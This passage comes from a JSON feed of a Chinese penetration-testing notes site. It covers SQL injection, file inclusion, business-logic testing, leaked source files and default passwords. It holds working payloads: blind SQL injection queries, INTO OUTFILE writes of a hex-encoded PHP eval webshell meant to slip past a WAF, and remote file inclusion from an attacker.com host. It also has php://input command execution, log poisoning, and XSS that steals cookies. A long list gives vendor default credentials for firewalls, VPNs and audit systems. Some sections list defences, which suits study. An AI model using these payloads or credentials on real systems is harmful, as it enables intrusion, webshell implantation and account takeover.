table_schema<span>=</span><span>database</span><span>(</span><span>)</span> <span>)</span><span>=</span><span>1</span><span>,</span>sleep<span>(</span><span>5</span><span>)</span><span>,</span><span>1</span><span>)</span><span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_4-猜测表名的长度\"> 4. 猜测表名的长度</h3>\n<div><pre><code><span>and</span> <span>if</span><span>(</span><span>(</span><span>select</span> <span>count</span><span>(</span>table_name<span>)</span> <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema<span>=</span><span>database</span><span>(</span><span>)</span> <span>)</span><span>=</span><span>1</span><span>,</span>sleep<span>(</span><span>5</span><span>)</span><span>,</span><span>1</span><span>)</span><span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_5-猜测字段-2\"> 5. 猜测字段</h3>\n<div><pre><code><span>and</span> <span>if</span><span>(</span>ascii<span>(</span>substr<span>(</span><span>(</span><span>select</span> column_name <span>from</span> information_schema<span>.</span><span>columns</span> <span>where</span> table_name<span>=</span><span>'users'</span> <span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>></span><span>120</span><span>,</span>sleep<span>(</span><span>5</span><span>)</span><span>,</span><span>1</span><span>)</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"_0x04-其他函数\"> 0x04. 其他函数</h2>\n<ul>\n<li>MID(ColumnName, Start, Length]) - 用于从文本字段中提取字符</li>\n</ul>\n<div><pre><code><span>SELECT</span> <span>MID</span><span>(</span>column_name<span>,</span><span>start</span><span>,</span>length<span>]</span><span>)</span> <span>FROM</span> table_name\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>LEFT(str,len) - 返回字符串str的最左面len个字符</li>\n<li>ASCII(str) - 返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</li>\n</ul>\n<div><pre><code>ascii<span>(</span>substr<span>(</span><span>(</span><span>select</span> table_name <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema <span>=</span><span>database</span><span>(</span><span>)</span><span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>=</span><span>101</span> –<span>+</span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>CAST() - 将目标str转化为目标数据类型</li>\n</ul>\n<div><pre><code><span>SELECT</span> CAST<span>(</span>’<span>12</span>’ <span>AS</span> <span>int</span><span>)</span>     \n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>IFNULL(expr1,expr2) - 如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2</li>\n<li>LOAD_FILE\n说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码<div><pre><code><span>-</span><span>1</span> <span>union</span> <span>select</span> <span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span>load_file<span>(</span><span>char</span><span>(</span><span>99</span><span>,</span><span>58</span><span>,</span><span>47</span><span>,</span><span>98</span><span>,</span><span>111</span><span>,</span><span>111</span><span>,</span><span>116</span><span>,</span><span>46</span><span>,</span><span>105</span><span>,</span><span>110</span><span>,</span><span>105</span><span>)</span><span>)</span>\n</code></pre>\n<div><span>1</span><br></div></div>说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”<div><pre><code><span>-</span><span>1</span> <span>union</span> <span>select</span> <span>1</span><span>,</span><span>1</span><span>,</span><span>1</span><span>,</span>load_file<span>(</span><span>0x633a2f626f6f742e696e69</span><span>)</span>\n</code></pre>\n<div><span>1</span><br></div></div>将其他路径包含一句话木马的文件导出成php来链接<div><pre><code><span>select</span> load_file<span>(</span><span>'c:\\\\wamp\\\\bin\\\\mysql\\\\mysql5.6.17\\\\my.ini'</span><span>)</span> <span>into</span> <span>outfile</span> <span>'c:\\\\wamp\\\\www\\\\test.php'</span>\n</code></pre>\n<div><span>1</span><br></div></div></li>\n</ul>\n<h2 id=\"_0x05-读文件-写shell\"> 0x05. 读文件/写shell</h2>\n<ul>\n<li>union方式<div><pre><code><span>-</span><span>1</span> <span>union</span> <span>select</span> <span>1</span><span>,</span><span>user</span><span>(</span><span>)</span><span>,</span><span>3</span> <span>into</span> <span>outfile</span> <span>\"C:\\\\test.txt\"</span> <span>--+</span>\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>16进制写shell &lt;    ?   eval($_POST[x]);?&gt;可以过waf<div><pre><code><span>-</span><span>1</span> <span>union</span> <span>select</span> <span>0x3c</span><span>,</span><span>0x3f</span><span>,</span><span>0x6576616C28245F504F53545B785D293B3F3E</span> <span>into</span> <span>outfile</span> <span>\"C:\\\\test.php\"</span> <span>--+</span>\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>分隔符写shell</li>\n</ul>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> admin <span>where</span> id<span>=</span><span>1</span> <span>into</span> <span>outfile</span> <span>'F:\\WWW\\phpinfo.php'</span> <span>fields</span> <span>terminated</span> <span>by</span> <span>'&lt;? phpinfo(); ?>'</span><span>%</span><span>23</span>     <span>#分隔符也可以用16进制表示</span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>读文件</li>\n</ul>\n<div><pre><code><span>select</span> load_file<span>(</span><span>'c:/boot.ini'</span><span>)</span>\n</code></pre>\n<div><span>1</span><br></div></div>",
      "date_published": "2021-08-18T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "文件包含",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/3.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/3.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
      "content_html": "<h2 id=\"_0x01-典型特征\"> 0x01. 典型特征</h2>\n<div><pre><code>?page=a.php\n?home=b.html\n?file=content\n?name=a.php\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id=\"_0x02-php常见导致文件包含的函数\"> 0x02. php常见导致文件包含的函数：</h2>\n<div><pre><code><span>include</span><span>(</span><span>)</span>\n<span>include_once</span><span>(</span><span>)</span>\n<span>require</span><span>(</span><span>)</span>\n<span>require_once</span><span>(</span><span>)</span>\n<span>fopen</span><span>(</span><span>)</span>\n<span>readfile</span><span>(</span><span>)</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id=\"_0x03-利用\"> 0x03. 利用</h2>\n<ol>\n<li>读取文件</li>\n</ol>\n<div><pre><code>http://www.xxser.com/index.php?page=/etc/passwd\n</code></pre>\n<div><span>1</span><br></div></div><ol start=\"2\">\n<li>远程包含shell<br>\nallow_url_fopen=on 情况下</li>\n</ol>\n<div><pre><code>http://www.example.com/index.php?page=http://www.attacker.com/echo.txt\n其中echo.txt内容为:&lt;?php eval($_POST[xxser]);?&gt;\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><ol start=\"3\">\n<li>本地包含配合文件上传漏洞包含shell</li>\n</ol>\n<div><pre><code>上传一句话木马文件后，通过文件包含利用，非php扩展文件被包含后也会被当作php解析\nhttp://www.example.com/index.php?page=./uploadfile/xxx.jpg\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><ol start=\"4\">\n<li>PHP协议</li>\n</ol>\n<ul>\n<li>php://filter<br>\n一种元封装器，用于数据流打开时的筛选过滤应用</li>\n</ul>\n<div><pre><code><span>http<span>:</span></span><span><span>//</span><span>www.example.com</span></span><span><span>/</span>index.php</span><span><span>?</span><span><span>page</span>=<span>php://filter/read=convert.base64-encode/resource=config.php</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>php://input<br>\nphp://input是个可以访问请求的原始数据的只读流,可以接收post请求，将请求作为PHP代码的输入传递给目标变量</li>\n</ul>\n<div><pre><code>http://www.example.com/index.php?page=php://input\n实例：\nPOST /?file=php://input\n&lt;?php system(&quot;cat /flag&quot;);?&gt;\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ol start=\"5\">\n<li>包含日志文件</li>\n</ol>\n<div><pre><code>先访问：http://www.example.com/&lt;?php phpinfo();?&gt;生成日志\n再访问：http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log\n关键在于确定apache路径\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ol start=\"6\">\n<li>截断包含<br>\nmagic_quotes_gpc=off 情况下</li>\n</ol>\n<div><pre><code><span>http<span>:</span></span><span><span>//</span><span>www.example.com</span></span><span><span>/</span>index.php</span><span><span>?</span><span><span>page</span>=<span>1.jpg%00</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div>",
      "date_published": "2021-08-20T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "业务安全测试",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/4.%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/4.%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/",
      "content_html": "<h3 id=\"_1-业务安全测试\"> 1. 业务安全测试</h3>\n<p>1分钱支付，购物车零元支付，身份变更</p>\n<h3 id=\"_2-登录认证模块测试\"> 2. 登录认证模块测试</h3>\n<h4 id=\"暴力破解\"> 暴力破解</h4>\n<ol>\n<li>当系统存在登录功能，并且没有做好对应的防护措施时。</li>\n<li>测试 工具: Burp Suite</li>\n<li>防御方法：\n<ol>\n<li>增加验证码：登录失败一次，验证码变换一次</li>\n<li>配置登录失败次数限制策略</li>\n<li>条件允许下：增加收集短信或邮箱验证码，双因素验证</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"cookie仿冒测试\"> Cookie仿冒测试</h4>\n<ol>\n<li>通过修改Cookie中的身份，从而达到仿冒其他用户身份目的，并拥有相关用户的权限</li>\n<li>案例\n<ol>\n<li>通过篡改Cookie认证会话值成功转变身份</li>\n</ol>\n</li>\n<li>测试方法\n<ol>\n<li>获取已授权的用户身份的Cookie会话值</li>\n<li>篡改已授权用户Cookie值，成功转换身份</li>\n</ol>\n</li>\n<li>防御方法\n<ol>\n<li>对身份标识及敏感信息数据使用更为安全的Session会话认证方式存储，避免被其他人利用</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"密文对比认证测试\"> 密文对比认证测试</h4>\n<ol>\n<li>认证密码提交到服务器，服务器进行加密后在数据库检查是否正确</li>\n<li>如果在客户端对密码进行加密，会暴露密码加密算法</li>\n<li>测试方法：\n<ol>\n<li>分析客户端密码加密方法</li>\n<li>在burpsuite中配置对应加密方法，进行暴力破解</li>\n</ol>\n</li>\n<li>防御方案\n<ol>\n<li>将密码加密过程及密文对比过程放置在服务器后台执行</li>\n<li>对用户登录添加有效的验证码机制</li>\n<li>对密码加密数据进行加盐处理存储</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"登录失败信息测试\"> 登录失败信息测试</h4>\n<ol>\n<li>\n<p>案例：登录失败时提示错误信息：“用户名不存在”，“账号不存在”，“密码错误”</p>\n</li>\n<li>\n<p>测试方法：</p>\n<p>根据返回信息不同，先进行账号是否存在猜测。</p>\n</li>\n<li>\n<p>防御方法：</p>\n<p>对登录失败返回信息进行统一的模糊处理，提高用户名及密码猜测难度。</p>\n</li>\n</ol>\n<h3 id=\"_3-业务办理模块测试\"> 3. 业务办理模块测试</h3>\n<h4 id=\"竞争条件测试\"> 竞争条件测试</h4>\n<ol>\n<li>竞争条件漏洞原理：\n<ol>\n<li>当多个进程或线程在读写一个共享数据时，结果依赖于它们执行的相对时间的情形。</li>\n<li>在web中，当多个进程对同一数据库进行读写时，可能会由于时序问题，造成一些逻辑错误的异常情况。</li>\n</ol>\n</li>\n<li>场景：\n<ol>\n<li>超卖问题：卖出数量大于库存数量</li>\n<li>支付逻辑：在余额数据更新之前，多次购买，兑换产品</li>\n<li>文件上传：在服务器判断删除webshell操作，之前访问脚本</li>\n</ol>\n</li>\n<li>漏洞修复\n<ol>\n<li>使用事务，保证逻辑正确</li>\n<li>使用select…for update数据库实现悲观锁</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"_4-业务授权访问模块测试\"> 4. 业务授权访问模块测试</h3>\n<h4 id=\"越权漏洞\"> 越权漏洞</h4>\n<p>水平越权、垂直越权</p>\n<ol>\n<li>测试方法：\n<ol>\n<li>水平越权：修改访问数据中的身份标识，测试是否能访问其他人的数据</li>\n<li>垂直越权：在注册或修改密码时抓取数据，修改身份标识，获取管理员密码</li>\n</ol>\n</li>\n<li>防御方法\n<ol>\n<li>关键操作前进行身份鉴别</li>\n<li>关键顺序操作每一步都要进行身份鉴别</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"_5-输入输出模块\"> 5. 输入输出模块</h3>\n<h4 id=\"sql注入\"> SQL注入</h4>\n<ol>\n<li>类型：字符型，数字型</li>\n<li>手工测试：\n<ol>\n<li>发现注入点</li>\n<li>数据表列数测试： order by 1</li>\n<li>显示点测试：select 1,2,3</li>\n<li>获取库名，列名</li>\n<li>获取数据</li>\n</ol>\n</li>\n<li>防御：\n<ol>\n<li>sql关键字过滤</li>\n<li>sql语句特殊符号过滤，转义</li>\n<li>使用传参方式进行数据库查询操作</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"xss注入\"> XSS注入</h4>\n<div><pre><code><span>&lt;</span>script<span>></span><span>alert</span><span>(</span><span>1</span><span>)</span><span>&lt;</span><span>/</span>script<span>></span>\n<span>&lt;</span>scrip<span>&lt;</span>script<span>></span>t<span>></span><span>alert</span><span>(</span><span>1</span><span>)</span><span>&lt;</span><span>/</span>script<span>></span>\n<span>&lt;</span>Script<span>></span><span>alert</span><span>(</span><span>1</span><span>)</span><span>&lt;</span><span>/</span>script<span>></span>\n<span>&lt;</span>img src<span>=</span><span>1</span> onerror<span>=</span><span>alert</span><span>(</span><span>1</span><span>)</span><span>></span>\n<span>&amp;</span>#x003c<span>;</span>img src<span>=</span><span>1</span> onerror<span>=</span><span>alert</span><span>(</span>document<span>.</span>cookie<span>)</span><span>&amp;</span>#x003e<span>;</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ol>\n<li>防御：\n<ol>\n<li>完善输入输出检查，过滤其中包含的特殊字符，或转义</li>\n<li>信息搜索功能不应在搜索结果回显搜索内容</li>\n<li>设置出错页面，防止出错时内部信息返回给客户端</li>\n</ol>\n</li>\n<li>命令执行</li>\n</ol>\n<h3 id=\"_6-验证码机制模块\"> 6. 验证码机制模块</h3>\n<h4 id=\"验证码暴力破解\"> 验证码暴力破解</h4>\n<ol>\n<li>通过暴力破解短信验证码实现重置任意用户密码。</li>\n<li>测试方法\n<ol>\n<li>接受验证码，观察验证码是否有规律。</li>\n<li>多次填写验证码提交，观察是否有时效性或次数限制。</li>\n<li>通过工具暴力猜解验证码。</li>\n</ol>\n</li>\n<li>测试工具：burpsuite</li>\n<li>防御\n<ol>\n<li>提高验证码复杂度。</li>\n<li>设置单位时间内验证码输入错误的次数。</li>\n<li>缩短验证码的时效。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"验证码客户端回显测试\"> 验证码客户端回显测试</h4>\n<ol>\n<li>验证码客户端向网站系统发送一条验证码的请求时，验证码会直接返回显示在前端页面中，或者可通过抓包工具截获该验证码。</li>\n<li>原理：把验证码校验的功能放到客户端进行。</li>\n<li>测试方法\n<ol>\n<li>数据任意手机号，点击发送验证码并抓取数据包。</li>\n<li>查看返回数据包，观察验证码是否回显。</li>\n</ol>\n</li>\n<li>防御方案：\n<ol>\n<li>在服务端对验证码进行校验。</li>\n<li>禁止验证码回显到客户端。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"验证码绕过测试\"> 验证码绕过测试</h4>\n<ol>\n<li>原理：在本地进行验证码校验。</li>\n<li>测试方法\n<ol>\n<li>接收验证码后，输入任意验证码，并提交抓包。</li>\n<li>尝试修改返回包中相关的参数值。</li>\n<li>转发数据包，观察是否绕过成功。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"验证码自动识别\"> 验证码自动识别</h4>\n<ol>\n<li>一般识别流程：图像去二值话-&gt;去干扰-&gt;字符分割-&gt;字符识别</li>\n<li>一般识别率达到70%就判断存在高风险。</li>\n<li>工具：burpsuite， Pkav http fuzzer</li>\n<li>防御方案：\n<ol>\n<li>增加验证码背景元素干扰。</li>\n<li>字符字体扭曲，粘连。</li>\n<li>使用公式、逻辑验证等方法作为验证码。如四则运算，问答题等。</li>\n<li>图形验证码和使用者相关，如选择联系人头像，购买过的物品等。</li>\n<li>对单位内提交请求失败次数进行限制。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"验证码重复使用测试\"> 验证码重复使用测试</h4>\n<ol>\n<li>重复使用验证码，用于暴力破解等攻击。</li>\n<li>测试方法：\n<ol>\n<li>burpsuite抓取登录包。</li>\n<li>重放登录包，未提示验证码异常则存在烟瘴吗重复使用漏洞。</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"_7-支付漏洞\"> 7. 支付漏洞</h3>\n<h4 id=\"业务篡改测试\"> 业务篡改测试</h4>\n<ol>\n<li>支付逻辑漏洞。</li>\n<li>危害：数据篡改、低价购买、反复订购、刷单刷库存……</li>\n<li>测试：\n<ol>\n<li>抓包获取请求中的商品金额、商品数量、折扣等字段</li>\n<li>修改字段并提交</li>\n<li>观察支付流程是否继续完成</li>\n</ol>\n</li>\n<li>防御方案：\n<ol>\n<li>只从客户端获取商品id和数量。</li>\n<li>对数量范围进行限制。</li>\n<li>对支付金额和订单金额进行对比以及加入签名验证避免关键字段篡改。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"业务数据重放\"> 业务数据重放</h4>\n<ol>\n<li>一次支付，多次收货</li>\n<li>防御方案：\n<ol>\n<li>尽量少的支付请求。</li>\n<li>对于多次出现同一订购要求，直接要求重新下单不让支付。</li>\n<li>每次生成新的交易流水号。</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"_8-密码找回漏洞\"> 8. 密码找回漏洞</h3>\n<h4 id=\"暴力破解用户凭证\"> 暴力破解用户凭证</h4>\n<ol>\n<li>利用密码找回漏洞重置其他用户密码，盗取账号，冒用他人身份。</li>\n<li>在找回密码时，对用户凭证进行暴力破解。</li>\n<li>防御：\n<ol>\n<li>对用户凭证验证次数和频率进行限制，防止暴力枚举攻击。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"密码找回漏洞\"> 密码找回漏洞</h4>\n<h4 id=\"服务端验证逻辑缺陷\"> 服务端验证逻辑缺陷</h4>\n<ol>\n<li>测试方法案例：\n<ol>\n<li>删除验证参数绕过。</li>\n<li>修改验证邮箱参数。</li>\n<li>直接访问修改密码链接。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"注册覆盖和session覆盖\"> 注册覆盖和session覆盖</h4>\n<ol>\n<li>通过重复注册已存在的账户，或者在同一个浏览器中打开不同用户的多个密码找回页面，利用session覆盖等方式成功重置其他人的密码。</li>\n<li>测试方法：\n<ol>\n<li>利用自己的账号A进行密码找回，收到邮件后先不访问密码重置连接。</li>\n<li>紧接着在同浏览器内打开网站再次进行密码找回页面，输入其他人的账号B，点击发送密码邮件后停在该页面。</li>\n<li>在同一浏览器中打开第1步中自己邮件收到的连接，重置一个新密码。</li>\n<li>观察是否能用心设置的密码成功登陆账号B。</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"_9-业务接口测试\"> 9. 业务接口测试</h3>\n<h4 id=\"业务接口未授权访问测试\"> 业务接口未授权访问测试</h4>\n<ol>\n<li>开发人员在进行接口开发的时候，对接口调用者的身份缺少认证，导致攻击者可以在未进行身份权限认证的情况下获取敏感数据信息。</li>\n<li>通过burpsuite观察接口返回信息是否存在敏感信息，存在敏感信息则存在接口未授权漏洞。</li>\n</ol>\n<h4 id=\"callback自定义测试\"> Callback自定义测试</h4>\n<ol>\n<li>接口开发时，在接受回调函数的参数值，在进行拼接前没有对恶意数据进行合理的精华，导致攻击者恶意插入的html标签在返回的json数据格式原样输出。导致返回的json数据被浏览器当做html内容进行解析，造成了xss等漏洞的出现。</li>\n<li>测试：\n<ol>\n<li>在burpsuite中httphistory中寻找callback、jsonp、cb=关键字请求。</li>\n<li>观察请求响应的Content-type是否为text/html，且内容是否为jsonp形式。</li>\n<li>如果符合要求，则修改回调参数为xxx<h1>1</h1>，观察响应中是否为html是否被转义。如果没有，则存在Callback自定义测试漏洞。</li>\n</ol>\n</li>\n</ol>\n<h4 id=\"webservice测试\"> WebService测试</h4>\n<ol>\n<li>WebService是一种以XML作为数据交换格式的应用接口，开发者能够以HTTP请求的方式来调用WebService执行不同的功能，这些功能可能影响着数据库、文件等：WebService SQL注入测试、WebService XML外部实体攻击测试、WebService XPATH注入测试</li>\n<li>AWVS（Acunetix Web Vulnerability Scanner）</li>\n<li>Url后添加?wsdl参数</li>\n</ol>\n<h3 id=\"_10-越权漏洞\"> 10. 越权漏洞</h3>\n<h4 id=\"水平越权\"> 水平越权</h4>\n<ol>\n<li>修改请求数据包中代表用户ID相关参数值，判断是否可以获取其他用户信息。</li>\n</ol>\n<h4 id=\"垂直越权\"> 垂直越权</h4>\n<ol>\n<li>在没有任何权限的情况下添加管理员用户，获得管理员权限。</li>\n<li>测试方法：\n<ol>\n<li>在添加用户处抓取请求数据包，生成form表单，设置账号密码，越权添加管理员用户。</li>\n</ol>\n</li>\n</ol>\n",
      "date_published": "2021-08-20T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "网站文件泄露",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/5.%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/5.%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/",
      "content_html": "<h2 id=\"目录遍历\"> 目录遍历</h2>\n<p>由于配置错误导致网站的目录可被遍历，一般该类漏洞可以为后续利用提供一些信息上的帮助</p>\n<h3 id=\"备份文件下载\"> 备份文件下载</h3>\n<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露</p>\n<div><pre><code>     zip、tar、tar.gz、rar\n     .bak\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h3 id=\"vim缓存\"> vim缓存</h3>\n<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露</p>\n<div><pre><code>     .swp\n     .swo\n     .swn\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h3 id=\"ds-store缓存\"> .DS_Store缓存</h3>\n<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单</p>\n<h3 id=\"版本控制文件泄露\"> 版本控制文件泄露</h3>\n<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</p>\n<ul>\n<li>使用.git泄露利用工具<a href=\"https://github.com/BugScanTeam/GitHack\" target=\"_blank\" rel=\"noopener noreferrer\">GitHack</a>可以根据.get文件将代码clone到本地</li>\n<li>针对.svn等其他版本控制工具，可使用<a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener noreferrer\">dvcs-ripper</a>收集代码和信息</li>\n<li>工具使用见<a href=\"./版本控制工具文件泄漏.html\">版本控制工具文件泄漏</a></li>\n</ul>\n",
      "date_published": "2021-08-15T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "默认密码收集",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/6.%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/6.%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/",
      "content_html": "<h2 id=\"各种系统默认用户名密码收集\"> 各种系统默认用户名密码收集</h2>\n<h2 id=\"oa\"> OA</h2>\n<h3 id=\"致远oa\"> 致远OA</h3>\n<div><pre><code>system用户（默认密码：system，对应A8的系统管理员、A6的单位管理员）\n\ngroup-admin（默认密码：123456，对应A8集团版的集团管理员）\n\nadmin1（默认密码：123456，对应A8企业版的单位管理员）\n\naudit-admin（默认密码：123456，对应审计管理员）\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h3 id=\"泛微oa\"> 泛微OA</h3>\n<div><pre><code>用户名:sysadmin 密码:1\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"安全设备\"> 安全设备</h2>\n<h3 id=\"常见安全设备\"> 常见安全设备</h3>\n<div><pre><code>天融信防火墙 用户名:superman 密码:talent\n\n天融信防火墙 用户名:superman 密码:talent!23\n\n联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766\n\n深信服防火墙 用户名：admin 密码：admin\n\n启明星辰 用户名：admin 密码：bane@7766 用户名：admin 密码：admin@123\n\njuniper 用户名:netscreen 密码:netscreen\n\nCisco 用户名:admin 密码:cisco\n\nHuawei 用户名:admin 密码:Admin@123\n\nH3C 用户名:admin 密码:admin\n\n绿x盟IPS 用户名: weboper 密码: weboper\n\n网神防火墙GE1 用户名：admin 密码：firewall\n\n深信服VPN：51111端口 密码:delanrecover\n\n华为VPN：账号：root 密码：mduadmin\n\n华为超融合：admin 密码：Huawei12#$\n\n华为防火墙：admin 密码:Admin@123\n\nEudemonJuniper防火墙：netscreen netscreen\n\n迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)\n\n山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone\n\n安恒的明御防火墙 admin/adminadmin\n\n某堡垒机 shterm/shterm\n\n天融信的vpn test/123456\n\n阿姆瑞特防火墙admin/manager\n\n明御WEB应用防火墙admin/admin\n\n明御安全网关admin/adminadmin\n\n天清汗马admin/veuns.fw audit/veuns.audit\n\n网康日志中心ns25000/ns25000\n\n网络安全审计系统（中科新业）admin/123456\n\nLogBase日志管理综合审计系统admin/safetybase\n\n中新金盾硬件防火墙admin/123\n\nkill防火墙(冠群金辰)admin/sys123\n\n黑盾防火墙admin/admin\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br></div></div><h3 id=\"绿盟安全产品\"> 绿盟安全产品</h3>\n<p>IPS入侵防御系统、SAS­H运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统、UTS威胁检测系统</p>\n<div><pre><code>sysauditor/sysauditor\n\nsysmanager/sysmanager\n\nsupervisor/supervisor\n\nmaintainer/maintainer\n\nwebpolicy/webpolicy\n\nsysadmin/sysadmin\n\nconadmin/conadmin\n\nsupervis/supervis\n\nwebaudit/webaudit\n\nsysadmin/sysadmin\n\nconadmin/nsfocus\n\nweboper/weboper\n\nauditor/auditor\n\nweboper/weboper\n\nnsadmin/nsadmin\n\nadmin/nsfocus\n\nadmin/admin\n\nshell/shell\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></div></div><h2 id=\"其他\"> 